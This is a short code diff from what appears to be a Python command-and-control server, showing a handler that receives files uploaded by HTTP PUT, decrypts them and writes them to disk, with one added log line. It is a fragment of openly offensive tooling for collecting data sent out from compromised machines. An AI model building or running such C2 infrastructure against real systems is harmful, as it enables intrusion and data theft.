@@ -122,6 +122,7 @@ class C2Handler(BaseHTTPRequestHandler):
             file_length = int(self.headers["Content-Length"])
             with open(incoming_file, 'wb') as file_handle:
                 file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
+            print(f"{incoming_file} has been written in c2 server")
         else:
             print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP PUT. why ?\n")
 
